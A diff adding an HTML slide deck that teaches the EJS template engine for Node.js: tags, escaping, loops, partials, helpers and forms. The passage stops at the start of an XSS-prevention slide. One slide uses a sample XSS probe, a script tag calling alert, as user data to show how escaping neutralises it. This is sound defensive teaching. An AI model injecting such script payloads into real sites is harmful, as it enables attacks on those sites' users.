@@ -1,0 +1,1394 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Introduction to EJS</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700&family=DM+Sans:wght@300;400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.6.1/reveal.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.6.1/theme/black.min.css">
+  <style>
+:root {
+  --amber:  #f5a623;
+  --green:  #4ecb8d;
+  --purple: #a78bfa;
+  --blue:   #60a5fa;
+  --red:    #f87171;
+  --bg:     #0a0a0f;
+  --bg2:    #10101a;
+  --bg3:    #181824;
+  --border: #2a2a3a;
+  --text:   #e8e8f0;
+  --muted:  #8888a8;
+}
+
+.reveal-viewport { background: var(--bg); }
+.reveal .slides section { background: transparent; }
+
+.reveal { font-family: 'DM Sans', sans-serif; color: var(--text); }
+.reveal h1, .reveal h2, .reveal h3 { font-family: 'Playfair Display', serif; font-weight: 700; }
+.reveal h1 { font-size: 1.6em; color: var(--amber); line-height: 1.1; }
+.reveal h2 { font-size: 1.1em; color: var(--amber); margin-bottom: .2em; }
+.reveal h3 { font-size: .78em; color: var(--green); margin-bottom: .15em; }
+.reveal p  { font-size: .56em; line-height: 1.45; color: var(--text); }
+.reveal li { font-size: .54em; line-height: 1.45; margin-bottom: .1em; }
+.reveal code { font-family: 'JetBrains Mono', monospace; font-size: .72em; }
+.reveal pre  { box-shadow: none; background: var(--bg3); border: 1px solid var(--border);
+               border-radius: 6px; padding: .3em .5em; margin: .25em 0; }
+.reveal pre code { font-size: .52em; line-height: 1.35; background: transparent; color: #cdd6f4; }
+
+.slide-hdr {
+  display: flex; align-items: center; gap: .4em;
+  border-bottom: 1px solid var(--border);
+  padding-bottom: .2em; margin-bottom: .3em;
+}
+.slide-hdr .tag {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: .42em; font-weight: 500;
+  color: var(--bg); background: var(--amber);
+  padding: .1em .4em; border-radius: 3px;
+  letter-spacing: .04em;
+}
+.slide-hdr h2 { margin: 0; font-size: .95em; }
+
+.cols   { display: grid; gap: .5em; }
+.cols-2 { grid-template-columns: 1fr 1fr; }
+.cols-3 { grid-template-columns: 1fr 1fr 1fr; }
+.cols-6040 { grid-template-columns: 6fr 4fr; }
+.cols-4060 { grid-template-columns: 4fr 6fr; }
+
+.card {
+  background: var(--bg2); border: 1px solid var(--border);
+  border-radius: 6px; padding: .35em .6em;
+}
+.card.amber { border-left: 3px solid var(--amber); }
+.card.green { border-left: 3px solid var(--green); }
+.card.purple{ border-left: 3px solid var(--purple); }
+.card.blue  { border-left: 3px solid var(--blue); }
+.card.red   { border-left: 3px solid var(--red); }
+.card h3 { font-size: .64em; margin: 0 0 .12em; }
+.card p  { font-size: .52em; margin: 0; color: #b8b8d0; }
+.card ul { margin: 0; padding-left: 1em; }
+.card li { font-size: .52em; color: #b8b8d0; margin-bottom: .02em; }
+
+.reveal table { width: 100%; border-collapse: collapse; font-size: .5em; }
+.reveal table th { background: var(--bg3); color: var(--amber); font-weight: 600;
+                   padding: .2em .4em; border: 1px solid var(--border); text-align: left; }
+.reveal table td { padding: .18em .4em; border: 1px solid var(--border); color: #ccc; }
+.reveal table tr:nth-child(even) td { background: #0e0e18; }
+
+.a  { color: var(--amber); font-weight: 600; }
+.g  { color: var(--green); font-weight: 600; }
+.p  { color: var(--purple); font-weight: 600; }
+.b  { color: var(--blue); font-weight: 600; }
+.r  { color: var(--red); font-weight: 600; }
+.mono { font-family: 'JetBrains Mono', monospace; }
+
+svg.diagram { display: block; margin: 0 auto; overflow: visible; }
+
+.pill {
+  display: inline-block; font-family: 'JetBrains Mono', monospace;
+  font-size: .44em; padding: .08em .4em; border-radius: 99px;
+  border: 1px solid; margin: 0 .08em;
+}
+.pill.amber { color: var(--amber); border-color: var(--amber); }
+.pill.green { color: var(--green); border-color: var(--green); }
+.pill.purple{ color: var(--purple); border-color: var(--purple); }
+.pill.blue  { color: var(--blue); border-color: var(--blue); }
+
+.reveal .slide-footer { display: none; }
+.title-slide h1 { font-size: 1.8em; }
+.title-slide .subtitle {
+  font-size: .7em; color: var(--green); font-family: 'DM Sans', sans-serif;
+  font-weight: 300; letter-spacing: .04em; margin: .3em 0 .6em;
+}
+.title-slide .meta { font-size: .48em; color: var(--muted); font-family: 'JetBrains Mono', monospace; }
+
+.reveal ul, .reveal ol { margin: .15em 0 .15em 1em; }
+.reveal .slides > section { display: flex !important; flex-direction: column !important; overflow-y: auto !important; align-items: stretch !important; justify-content: flex-start !important; }
+  </style>
+</head>
+<body>
+  <div class="reveal"><div class="slides">
+
+<!-- ============================================================ -->
+<!-- SLIDE 01 — TITLE -->
+<!-- ============================================================ -->
+<section class="title-slide" data-background-color="#0a0a0f">
+  <div style="text-align:left; max-width:820px; margin:0 auto; padding: 1em 0;">
+    <div style="font-family:'JetBrains Mono',monospace; font-size:.5em; color:var(--muted); margin-bottom:.4em; letter-spacing:.1em;">NODE.JS TEMPLATE ENGINES</div>
+    <h1>Introduction to EJS</h1>
+    <div class="subtitle">Embedded JavaScript &mdash; The Template Engine That's Just JavaScript</div>
+    <div style="width:60px; height:3px; background:var(--amber); margin-bottom:1.4em;"></div>
+    <div class="meta">19 slides &middot; tags, control flow, partials, security, performance &middot; 2026</div>
+  </div>
+</section>
+
+<!-- ============================================================ -->
+<!-- SLIDE 02 — AGENDA -->
+<!-- ============================================================ -->
+<section>
+  <div class="slide-hdr"><span class="tag">01</span><h2>Agenda</h2></div>
+  <div class="cols cols-2">
+    <div class="card amber">
+      <h3>Foundations</h3>
+      <ul>
+        <li>What Is EJS?</li>
+        <li>The Complete Tag Set</li>
+        <li>Escaped vs Unescaped Output</li>
+        <li>Control Flow &mdash; Conditionals</li>
+        <li>Control Flow &mdash; Loops</li>
+      </ul>
+    </div>
+    <div class="card green">
+      <h3>Data &amp; Structure</h3>
+      <ul>
+        <li>Passing Data to Templates</li>
+        <li>Layouts &amp; Boilerplate</li>
+        <li>Partials &amp; Includes</li>
+        <li>Custom Filters &amp; Helpers</li>
+      </ul>
+    </div>
+    <div class="card purple">
+      <h3>Practical Patterns</h3>
+      <ul>
+        <li>Forms &amp; User Input</li>
+        <li>Security &mdash; XSS Prevention</li>
+        <li>Error Handling &amp; Debugging</li>
+        <li>Performance &amp; Caching</li>
+      </ul>
+    </div>
+    <div class="card blue">
+      <h3>Production</h3>
+      <ul>
+        <li>EJS vs Other Engines</li>
+        <li>Real-World Project Structure</li>
+        <li>Complete Working Example</li>
+        <li>Summary &amp; Next Steps</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================ -->
+<!-- SLIDE 03 — WHAT IS EJS? -->
+<!-- ============================================================ -->
+<section>
+  <div class="slide-hdr"><span class="tag">02</span><h2>What Is EJS?</h2></div>
+  <div class="cols cols-6040">
+    <div>
+      <div class="card amber" style="margin-bottom:.4em;">
+        <h3>Philosophy: "Just JavaScript"</h3>
+        <p>EJS stands for <span class="a">Embedded JavaScript</span>. Created by <span class="g">TJ Holowaychuk</span> in 2010 as part of the Express.js ecosystem. Unlike Pug or Handlebars, EJS uses <span class="b">plain HTML</span> with embedded JS &mdash; no new syntax to learn.</p>
+      </div>
+      <div class="card green">
+        <h3>Key Characteristics</h3>
+        <ul>
+          <li><span class="a">Zero learning curve</span> &mdash; if you know JS and HTML, you know EJS</li>
+          <li><span class="a">No transpilation</span> &mdash; templates compile to plain JS functions</li>
+          <li><span class="a">Full JS power</span> &mdash; any valid JS expression works inside tags</li>
+          <li><span class="a">~4.7M weekly npm downloads</span> &mdash; most popular Node template engine</li>
+          <li><span class="a">Works anywhere</span> &mdash; server-side, CLI tools, static site generators</li>
+        </ul>
+      </div>
+    </div>
+    <div>
+      <div class="card blue" style="margin-bottom:.4em;">
+        <h3>Install &amp; Basic Use</h3>
+        <pre><code class="language-bash">npm install ejs</code></pre>
+        <pre><code class="language-javascript">const ejs = require('ejs');
+
+// Render a string template
+const html = ejs.render(
+  '&lt;h1&gt;&lt;%= title %&gt;&lt;/h1&gt;',
+  { title: 'Hello EJS' }
+);
+
+// Render a file
+ejs.renderFile(
+  './views/index.ejs',
+  { users: [...] },
+  (err, html) =&gt; {
+    res.send(html);
+  }
+);</code></pre>
+      </div>
+      <div class="card purple">
+        <h3>File Extension</h3>
+        <p>Convention: <code>.ejs</code> files. They're just HTML with embedded JS delimiters.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================ -->
+<!-- SLIDE 04 — EJS TAGS — THE COMPLETE SET -->
+<!-- ============================================================ -->
+<section>
+  <div class="slide-hdr"><span class="tag">03</span><h2>EJS Tags &mdash; The Complete Set</h2></div>
+  <table>
+    <thead>
+      <tr><th>Tag</th><th>Name</th><th>Purpose</th><th>Example</th></tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><code>&lt;%= %&gt;</code></td>
+        <td><span class="a">Escaped Output</span></td>
+        <td>Outputs value with HTML entity escaping</td>
+        <td><code>&lt;%= user.name %&gt;</code></td>
+      </tr>
+      <tr>
+        <td><code>&lt;%- %&gt;</code></td>
+        <td><span class="r">Unescaped Output</span></td>
+        <td>Outputs raw HTML &mdash; no escaping</td>
+        <td><code>&lt;%- include('header') %&gt;</code></td>
+      </tr>
+      <tr>
+        <td><code>&lt;% %&gt;</code></td>
+        <td><span class="g">Scriptlet</span></td>
+        <td>Executes JS &mdash; no output</td>
+        <td><code>&lt;% if (user) { %&gt;</code></td>
+      </tr>
+      <tr>
+        <td><code>&lt;%# %&gt;</code></td>
+        <td><span class="p">Comment</span></td>
+        <td>Ignored entirely &mdash; not in output</td>
+        <td><code>&lt;%# TODO: fix layout %&gt;</code></td>
+      </tr>
+      <tr>
+        <td><code>&lt;%_ %&gt;</code></td>
+        <td><span class="b">Whitespace Slurp (leading)</span></td>
+        <td>Strips all leading whitespace</td>
+        <td><code>&lt;%_ } %&gt;</code></td>
+      </tr>
+      <tr>
+        <td><code>&lt;% _%&gt;</code></td>
+        <td><span class="b">Whitespace Slurp (trailing)</span></td>
+        <td>Strips trailing newline</td>
+        <td><code>&lt;% items.forEach(i =&gt; { _%&gt;</code></td>
+      </tr>
+      <tr>
+        <td><code>&lt;%- _%&gt;</code></td>
+        <td><span class="b">Combo: raw + trim</span></td>
+        <td>Unescaped output with whitespace trim</td>
+        <td><code>&lt;%- include('nav') _%&gt;</code></td>
+      </tr>
+    </tbody>
+  </table>
+  <div class="card amber" style="margin-top:.3em;">
+    <p><span class="a">Golden Rule:</span> Use <code>&lt;%= %&gt;</code> by default. Only reach for <code>&lt;%- %&gt;</code> when you specifically need raw HTML (includes, pre-sanitised content).</p>
+  </div>
+</section>
+
+<!-- ============================================================ -->
+<!-- SLIDE 05 — OUTPUT TAGS: ESCAPED VS UNESCAPED -->
+<!-- ============================================================ -->
+<section>
+  <div class="slide-hdr"><span class="tag">04</span><h2>Output Tags &mdash; Escaped vs Unescaped</h2></div>
+  <div class="cols cols-2">
+    <div>
+      <div class="card green" style="margin-bottom:.4em;">
+        <h3><code>&lt;%= %&gt;</code> &mdash; Escaped (Safe)</h3>
+        <pre><code class="language-html">&lt;!-- Template --&gt;
+&lt;p&gt;&lt;%= userInput %&gt;&lt;/p&gt;
+
+&lt;!-- Data: { userInput: '&lt;script&gt;alert("xss")&lt;/script&gt;' } --&gt;
+
+&lt;!-- Output --&gt;
+&lt;p&gt;&amp;lt;script&amp;gt;alert(&amp;quot;xss&amp;quot;)
+&amp;lt;/script&amp;gt;&lt;/p&gt;</code></pre>
+        <p>Characters escaped: <code>&amp;</code> <code>&lt;</code> <code>&gt;</code> <code>"</code> <code>'</code></p>
+      </div>
+      <div class="card amber">
+        <h3>What Gets Escaped</h3>
+        <pre><code class="language-javascript">// EJS internal escape function
+function escape(s) {
+  return String(s)
+    .replace(/&amp;/g, '&amp;amp;')
+    .replace(/&lt;/g, '&amp;lt;')
+    .replace(/&gt;/g, '&amp;gt;')
+    .replace(/"/g, '&amp;quot;')
+    .replace(/'/g, '&amp;#39;');
+}</code></pre>
+      </div>
+    </div>
+    <div>
+      <div class="card red" style="margin-bottom:.4em;">
+        <h3><code>&lt;%- %&gt;</code> &mdash; Unescaped (Dangerous)</h3>
+        <pre><code class="language-html">&lt;!-- Template --&gt;
+&lt;div&gt;&lt;%- richContent %&gt;&lt;/div&gt;
+
+&lt;!-- Data: { richContent: '&lt;strong&gt;Bold&lt;/strong&gt;' } --&gt;
+
+&lt;!-- Output --&gt;
+&lt;div&gt;&lt;strong&gt;Bold&lt;/strong&gt;&lt;/div&gt;</code></pre>
+        <p>HTML renders as-is. <span class="r">Dangerous with user input!</span></p>
+      </div>
+      <div class="card blue">
+        <h3>When To Use Unescaped</h3>
+        <ul>
+          <li>Including partials: <code>&lt;%- include('nav') %&gt;</code></li>
+          <li>Pre-sanitised CMS content (DOMPurify, sanitize-html)</li>
+          <li>Markdown-to-HTML output you control</li>
+          <li><span class="r">Never</span> with raw user input</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================ -->
+<!-- SLIDE 06 — CONTROL FLOW: CONDITIONALS -->
+<!-- ============================================================ -->
+<section>
+  <div class="slide-hdr"><span class="tag">05</span><h2>Control Flow &mdash; Conditionals</h2></div>
+  <div class="cols cols-2">
+    <div>
+      <div class="card amber" style="margin-bottom:.4em;">
+        <h3>if / else if / else</h3>
+        <pre><code class="language-html">&lt;% if (user.role === 'admin') { %&gt;
+  &lt;div class="badge admin"&gt;Admin&lt;/div&gt;
+&lt;% } else if (user.role === 'editor') { %&gt;
+  &lt;div class="badge editor"&gt;Editor&lt;/div&gt;
+&lt;% } else { %&gt;
+  &lt;div class="badge member"&gt;Member&lt;/div&gt;
+&lt;% } %&gt;</code></pre>
+      </div>
+      <div class="card green">
+        <h3>Ternary in Output Tags</h3>
+        <pre><code class="language-html">&lt;span class="&lt;%= active ? 'on' : 'off' %&gt;"&gt;
+  &lt;%= active ? 'Active' : 'Inactive' %&gt;
+&lt;/span&gt;
+
+&lt;!-- Null-safe with optional chaining --&gt;
+&lt;p&gt;&lt;%= user?.address?.city ?? 'N/A' %&gt;&lt;/p&gt;</code></pre>
+      </div>
+    </div>
+    <div>
+      <div class="card purple" style="margin-bottom:.4em;">
+        <h3>Conditional Rendering Patterns</h3>
+        <pre><code class="language-html">&lt;!-- Show/hide blocks --&gt;
+&lt;% if (errors &amp;&amp; errors.length) { %&gt;
+  &lt;div class="alert alert-danger"&gt;
+    &lt;ul&gt;
+      &lt;% errors.forEach(e =&gt; { %&gt;
+        &lt;li&gt;&lt;%= e.msg %&gt;&lt;/li&gt;
+      &lt;% }) %&gt;
+    &lt;/ul&gt;
+  &lt;/div&gt;
+&lt;% } %&gt;
+
+&lt;!-- Conditional attributes --&gt;
+&lt;input type="text"
+  value="&lt;%= form.name || '' %&gt;"
+  &lt;%= form.disabled ? 'disabled' : '' %&gt;
+/&gt;
+
+&lt;!-- Conditional CSS classes --&gt;
+&lt;tr class="&lt;%= i % 2 === 0
+  ? 'row-even' : 'row-odd' %&gt;"&gt;</code></pre>
+      </div>
+      <div class="card blue">
+        <h3>Tip: Keep Logic Thin</h3>
+        <p>Move complex conditions into helper functions or compute them in the route handler. Templates should branch, not compute.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================ -->
+<!-- SLIDE 07 — CONTROL FLOW: LOOPS -->
+<!-- ============================================================ -->
+<section>
+  <div class="slide-hdr"><span class="tag">06</span><h2>Control Flow &mdash; Loops</h2></div>
+  <div class="cols cols-2">
+    <div>
+      <div class="card amber" style="margin-bottom:.4em;">
+        <h3>forEach (Most Common)</h3>
+        <pre><code class="language-html">&lt;ul&gt;
+  &lt;% users.forEach(user =&gt; { %&gt;
+    &lt;li&gt;
+      &lt;%= user.name %&gt;
+      &mdash; &lt;%= user.email %&gt;
+    &lt;/li&gt;
+  &lt;% }) %&gt;
+&lt;/ul&gt;</code></pre>
+      </div>
+      <div class="card green" style="margin-bottom:.4em;">
+        <h3>for...of Loop</h3>
+        <pre><code class="language-html">&lt;% for (const item of cart.items) { %&gt;
+  &lt;div class="cart-item"&gt;
+    &lt;span&gt;&lt;%= item.name %&gt;&lt;/span&gt;
+    &lt;span&gt;$&lt;%= item.price.toFixed(2) %&gt;&lt;/span&gt;
+  &lt;/div&gt;
+&lt;% } %&gt;</code></pre>
+      </div>
+      <div class="card purple">
+        <h3>Classic for Loop (Index Access)</h3>
+        <pre><code class="language-html">&lt;% for (let i = 0; i &lt; items.length; i++) { %&gt;
+  &lt;tr class="&lt;%= i % 2 === 0 ? 'even' : 'odd' %&gt;"&gt;
+    &lt;td&gt;&lt;%= i + 1 %&gt;&lt;/td&gt;
+    &lt;td&gt;&lt;%= items[i].name %&gt;&lt;/td&gt;
+  &lt;/tr&gt;
+&lt;% } %&gt;</code></pre>
+      </div>
+    </div>
+    <div>
+      <div class="card blue" style="margin-bottom:.4em;">
+        <h3>Iterating Objects</h3>
+        <pre><code class="language-html">&lt;!-- Object.entries --&gt;
+&lt;dl&gt;
+  &lt;% Object.entries(config).forEach(
+    ([key, val]) =&gt; { %&gt;
+    &lt;dt&gt;&lt;%= key %&gt;&lt;/dt&gt;
+    &lt;dd&gt;&lt;%= val %&gt;&lt;/dd&gt;
+  &lt;% }) %&gt;
+&lt;/dl&gt;
+
+&lt;!-- for...in --&gt;
+&lt;% for (const key in settings) { %&gt;
+  &lt;p&gt;&lt;%= key %&gt;: &lt;%= settings[key] %&gt;&lt;/p&gt;
+&lt;% } %&gt;</code></pre>
+      </div>
+      <div class="card red">
+        <h3>Empty State Pattern</h3>
+        <pre><code class="language-html">&lt;% if (products.length === 0) { %&gt;
+  &lt;p class="empty"&gt;No products found.&lt;/p&gt;
+&lt;% } else { %&gt;
+  &lt;% products.forEach(p =&gt; { %&gt;
+    &lt;div class="product"&gt;
+      &lt;%= p.name %&gt;
+    &lt;/div&gt;
+  &lt;% }) %&gt;
+&lt;% } %&gt;</code></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================ -->
+<!-- SLIDE 08 — PASSING DATA TO TEMPLATES -->
+<!-- ============================================================ -->
+<section>
+  <div class="slide-hdr"><span class="tag">07</span><h2>Passing Data to Templates</h2></div>
+  <div class="cols cols-2">
+    <div>
+      <div class="card amber" style="margin-bottom:.4em;">
+        <h3>Express res.render()</h3>
+        <pre><code class="language-javascript">// Route handler
+app.get('/dashboard', async (req, res) =&gt; {
+  const user = await User.findById(req.user.id);
+  const stats = await getStats(user.id);
+
+  res.render('dashboard', {
+    title: 'Dashboard',
+    user,
+    stats,
+    isAdmin: user.role === 'admin',
+    formatDate: (d) =&gt;
+      d.toLocaleDateString('en-GB')
+  });
+});</code></pre>
+      </div>
+      <div class="card green">
+        <h3>The locals Object</h3>
+        <pre><code class="language-javascript">// res.locals — per-request data
+app.use((req, res, next) =&gt; {
+  res.locals.currentUser = req.user;
+  res.locals.flash = req.flash();
+  next();
+});
+
+// Available in ALL templates for
+// this request — no need to pass
+// explicitly in res.render()</code></pre>
+      </div>
+    </div>
+    <div>
+      <div class="card purple" style="margin-bottom:.4em;">
+        <h3>app.locals &mdash; Global Data</h3>
+        <pre><code class="language-javascript">// Set once at startup
+app.locals.siteName = 'My App';
+app.locals.version = '2.1.0';
+app.locals.nav = [
+  { href: '/', label: 'Home' },
+  { href: '/about', label: 'About' },
+  { href: '/contact', label: 'Contact' },
+];
+
+// Accessible in every template:
+// &lt;%= siteName %&gt;  &lt;%= version %&gt;</code></pre>
+      </div>
+      <div class="card blue">
+        <h3>Data Merge Order</h3>
+        <p>EJS merges data in this priority (highest wins):</p>
+        <ol>
+          <li><code>res.render()</code> data object</li>
+          <li><code>res.locals</code></li>
+          <li><code>app.locals</code></li>
+        </ol>
+        <p>This means route-specific data overrides middleware-set data, which overrides global data.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================ -->
+<!-- SLIDE 09 — LAYOUTS & BOILERPLATE -->
+<!-- ============================================================ -->
+<section>
+  <div class="slide-hdr"><span class="tag">08</span><h2>Layouts &amp; Boilerplate</h2></div>
+  <div class="cols cols-2">
+    <div>
+      <div class="card amber" style="margin-bottom:.4em;">
+        <h3>Manual Layout with Includes</h3>
+        <pre><code class="language-html">&lt;!-- views/pages/home.ejs --&gt;
+&lt;%- include('../partials/head', {
+  title: 'Home'
+}) %&gt;
+&lt;%- include('../partials/nav') %&gt;
+
+&lt;main class="container"&gt;
+  &lt;h1&gt;Welcome, &lt;%= user.name %&gt;&lt;/h1&gt;
+  &lt;p&gt;&lt;%= tagline %&gt;&lt;/p&gt;
+&lt;/main&gt;
+
+&lt;%- include('../partials/footer') %&gt;</code></pre>
+        <p>Simple but repetitive &mdash; every page repeats the include boilerplate.</p>
+      </div>
+    </div>
+    <div>
+      <div class="card green" style="margin-bottom:.4em;">
+        <h3>express-ejs-layouts</h3>
+        <pre><code class="language-javascript">// app.js
+const ejsLayouts = require(
+  'express-ejs-layouts'
+);
+app.use(ejsLayouts);
+app.set('layout', 'layouts/main');</code></pre>
+        <pre><code class="language-html">&lt;!-- views/layouts/main.ejs --&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;&lt;%= title %&gt;&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+  &lt;%- include('../partials/nav') %&gt;
+  &lt;%- body %&gt;
+  &lt;%- include('../partials/footer') %&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+        <pre><code class="language-html">&lt;!-- views/home.ejs (just the content) --&gt;
+&lt;h1&gt;Welcome&lt;/h1&gt;
+&lt;p&gt;Page content goes here.&lt;/p&gt;</code></pre>
+      </div>
+      <div class="card purple">
+        <h3>ejs-mate (Alternative)</h3>
+        <p>Uses <code>layout('name')</code> function inside templates. Popular with older Express apps. Same concept, different API.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================ -->
+<!-- SLIDE 10 — PARTIALS & INCLUDES -->
+<!-- ============================================================ -->
+<section>
+  <div class="slide-hdr"><span class="tag">09</span><h2>Partials &amp; Includes</h2></div>
+  <div class="cols cols-6040">
+    <div>
+      <div class="card amber" style="margin-bottom:.4em;">
+        <h3>Basic include Syntax</h3>
+        <pre><code class="language-html">&lt;!-- No data passed --&gt;
+&lt;%- include('partials/nav') %&gt;
+
+&lt;!-- Pass data to partial --&gt;
+&lt;%- include('partials/card', {
+  title: product.name,
+  price: product.price,
+  image: product.imageUrl
+}) %&gt;</code></pre>
+        <p><span class="r">Important:</span> Use <code>&lt;%- %&gt;</code> (unescaped) for includes. Using <code>&lt;%= %&gt;</code> would escape the HTML output of the partial.</p>
+      </div>
+      <div class="card green">
+        <h3>Reusable Card Partial</h3>
+        <pre><code class="language-html">&lt;!-- views/partials/card.ejs --&gt;
+&lt;div class="card"&gt;
+  &lt;% if (image) { %&gt;
+    &lt;img src="&lt;%= image %&gt;"
+         alt="&lt;%= title %&gt;"&gt;
+  &lt;% } %&gt;
+  &lt;h3&gt;&lt;%= title %&gt;&lt;/h3&gt;
+  &lt;p class="price"&gt;
+    $&lt;%= price.toFixed(2) %&gt;
+  &lt;/p&gt;
+&lt;/div&gt;</code></pre>
+      </div>
+    </div>
+    <div>
+      <div class="card purple" style="margin-bottom:.4em;">
+        <h3>Loop + Include Pattern</h3>
+        <pre><code class="language-html">&lt;!-- Product listing page --&gt;
+&lt;div class="grid"&gt;
+  &lt;% products.forEach(p =&gt; { %&gt;
+    &lt;%- include('partials/card', {
+      title: p.name,
+      price: p.price,
+      image: p.img
+    }) %&gt;
+  &lt;% }) %&gt;
+&lt;/div&gt;</code></pre>
+      </div>
+      <div class="card blue" style="margin-bottom:.4em;">
+        <h3>Nested Includes</h3>
+        <pre><code class="language-html">&lt;!-- layout includes nav --&gt;
+&lt;!-- nav includes user-menu --&gt;
+&lt;!-- user-menu includes avatar --&gt;
+&lt;!-- Each partial is independent
+     and testable --&gt;</code></pre>
+      </div>
+      <div class="card red">
+        <h3>Path Resolution</h3>
+        <p>Paths are relative to the <em>including</em> template, or absolute from the <code>views</code> root if starting with <code>/</code>. Set <code>app.set('views', path.join(__dirname, 'views'))</code>.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================ -->
+<!-- SLIDE 11 — CUSTOM FILTERS & HELPERS -->
+<!-- ============================================================ -->
+<section>
+  <div class="slide-hdr"><span class="tag">10</span><h2>Custom Filters &amp; Helpers</h2></div>
+  <div class="cols cols-2">
+    <div>
+      <div class="card amber" style="margin-bottom:.4em;">
+        <h3>Passing Helper Functions</h3>
+        <pre><code class="language-javascript">// helpers/format.js
+module.exports = {
+  currency: (n, curr = 'GBP') =&gt;
+    new Intl.NumberFormat('en-GB', {
+      style: 'currency', currency: curr
+    }).format(n),
+
+  dateShort: (d) =&gt;
+    new Date(d).toLocaleDateString(
+      'en-GB',
+      { day: 'numeric', month: 'short',
+        year: 'numeric' }
+    ),
+
+  truncate: (str, len = 100) =&gt;
+    str.length &gt; len
+      ? str.slice(0, len) + '...'
+      : str,
+
+  pluralise: (count, word) =&gt;
+    `${count} ${word}${count !== 1 ? 's' : ''}`
+};</code></pre>
+      </div>
+    </div>
+    <div>
+      <div class="card green" style="margin-bottom:.4em;">
+        <h3>Register Globally via app.locals</h3>
+        <pre><code class="language-javascript">// app.js
+const fmt = require('./helpers/format');
+Object.assign(app.locals, fmt);
+
+// Now in ANY template:
+// &lt;%= currency(product.price) %&gt;
+// &lt;%= dateShort(post.createdAt) %&gt;
+// &lt;%= truncate(post.body, 200) %&gt;</code></pre>
+      </div>
+      <div class="card purple" style="margin-bottom:.4em;">
+        <h3>Using in Templates</h3>
+        <pre><code class="language-html">&lt;table&gt;
+  &lt;% orders.forEach(o =&gt; { %&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;%= o.id %&gt;&lt;/td&gt;
+      &lt;td&gt;&lt;%= dateShort(o.date) %&gt;&lt;/td&gt;
+      &lt;td&gt;&lt;%= currency(o.total) %&gt;&lt;/td&gt;
+      &lt;td&gt;&lt;%= pluralise(o.items, 'item') %&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;% }) %&gt;
+&lt;/table&gt;</code></pre>
+      </div>
+      <div class="card blue">
+        <h3>Tip</h3>
+        <p>Keep helpers <span class="a">pure functions</span> &mdash; no side effects, no DB calls. They format and transform, nothing more.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================ -->
+<!-- SLIDE 12 — FORMS & USER INPUT -->
+<!-- ============================================================ -->
+<section>
+  <div class="slide-hdr"><span class="tag">11</span><h2>Forms &amp; User Input</h2></div>
+  <div class="cols cols-2">
+    <div>
+      <div class="card amber" style="margin-bottom:.4em;">
+        <h3>Rendering a Form</h3>
+        <pre><code class="language-html">&lt;form action="/register" method="POST"&gt;
+  &lt;input type="hidden"
+    name="_csrf"
+    value="&lt;%= csrfToken %&gt;"&gt;
+
+  &lt;label for="name"&gt;Name&lt;/label&gt;
+  &lt;input type="text" id="name"
+    name="name"
+    value="&lt;%= form.name || '' %&gt;"
+    class="&lt;%= errors?.name
+      ? 'is-invalid' : '' %&gt;"&gt;
+  &lt;% if (errors?.name) { %&gt;
+    &lt;span class="error"&gt;
+      &lt;%= errors.name.msg %&gt;
+    &lt;/span&gt;
+  &lt;% } %&gt;
+
+  &lt;label for="email"&gt;Email&lt;/label&gt;
+  &lt;input type="email" id="email"
+    name="email"
+    value="&lt;%= form.email || '' %&gt;"&gt;
+
+  &lt;button type="submit"&gt;Register&lt;/button&gt;
+&lt;/form&gt;</code></pre>
+      </div>
+    </div>
+    <div>
+      <div class="card green" style="margin-bottom:.4em;">
+        <h3>Route: Repopulate on Error</h3>
+        <pre><code class="language-javascript">app.post('/register',
+  body('name').notEmpty().trim(),
+  body('email').isEmail(),
+  (req, res) =&gt; {
+    const errs = validationResult(req);
+    if (!errs.isEmpty()) {
+      return res.render('register', {
+        title: 'Register',
+        form: req.body,        // repopulate
+        errors: errs.mapped(), // field errors
+        csrfToken: req.csrfToken()
+      });
+    }
+    // ... create user
+  }
+);</code></pre>
+      </div>
+      <div class="card purple" style="margin-bottom:.4em;">
+        <h3>Select &amp; Checkbox Patterns</h3>
+        <pre><code class="language-html">&lt;select name="role"&gt;
+  &lt;% ['user','editor','admin'].forEach(r =&gt; { %&gt;
+    &lt;option value="&lt;%= r %&gt;"
+      &lt;%= form.role === r ? 'selected' : '' %&gt;&gt;
+      &lt;%= r %&gt;
+    &lt;/option&gt;
+  &lt;% }) %&gt;
+&lt;/select&gt;</code></pre>
+      </div>
+      <div class="card red">
+        <h3>CSRF Protection</h3>
+        <p>Always include a CSRF token in forms. Use <code>csurf</code> or the built-in <code>csrf-csrf</code> middleware. The hidden input ensures POST requests are legitimate.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================ -->
+<!-- SLIDE 13 — SECURITY: XSS PREVENTION -->
+<!-- ============================================================ -->
+<section>
+  <div class="slide-hdr"><span class="tag">12</span><h2>Security &mdash; XSS Prevention</h2></div>
+  <div class="cols cols-2">
+    <div>
+      <div class="card red" style="margin-bottom:.4em;">
+        <h3>The Danger: Cross-Site Scripting</h3>
+        <pre><code class="language-html">&lt;!-- VULNERABLE: unescaped user input --&gt;
